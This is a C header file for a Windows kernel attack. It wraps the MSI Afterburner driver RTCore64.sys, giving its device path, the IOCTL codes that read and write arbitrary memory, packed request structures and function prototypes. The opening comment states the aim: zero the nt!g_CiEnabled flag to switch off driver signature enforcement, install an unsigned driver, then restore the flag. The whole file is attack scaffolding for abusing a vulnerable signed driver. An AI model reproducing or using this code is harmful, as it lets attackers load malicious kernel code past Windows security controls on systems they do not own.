/*
 * km_rw.h — Kernel memory R/W via RTCore64.sys (MSI Afterburner driver)
 *
 * RTCore64 exposes physical memory read/write via documented IOCTLs.
 * We use this to patch nt!g_CiEnabled (DSE enforcement flag) to 0,
 * install the unsigned driver, then restore it.
 */

#pragma once
#include <windows.h>
#include <stdint.h>
#include <stdbool.h>

/* RTCore64 device path — driver must be loaded before calling Init() */
#define RTCORE64_DEVICE_NAME  "\\\\.\\RTCore64"

/* IOCTL codes from MSI Afterburner driver — read/write arbitrary physical memory */
#define RTCORE64_IOCTL_READ_MEM  0x80002048
#define RTCORE64_IOCTL_WRITE_MEM 0x8000204C

#pragma pack(push, 1)
typedef struct {
    uint8_t  pad0[8];
    uint64_t address;   /* virtual or physical depending on call */
    uint8_t  pad1[4];
    uint32_t read_size; /* 1, 2, 4, or 8 bytes */
    uint32_t value;     /* output */
    uint8_t  pad2[16];
} RTCore64ReadReq;

typedef struct {
    uint8_t  pad0[8];
    uint64_t address;
    uint8_t  pad1[4];
    uint32_t write_size;
    uint32_t value;     /* input */
    uint8_t  pad2[16];
} RTCore64WriteReq;
#pragma pack(pop)

bool    KmRw_Init(void);
void    KmRw_Close(void);
bool    KmRw_ReadQword(uint64_t addr, uint64_t *out);
bool    KmRw_ReadDword(uint64_t addr, uint32_t *out);
bool    KmRw_WriteDword(uint64_t addr, uint32_t val);
bool    KmRw_WriteByte(uint64_t addr, uint8_t val);
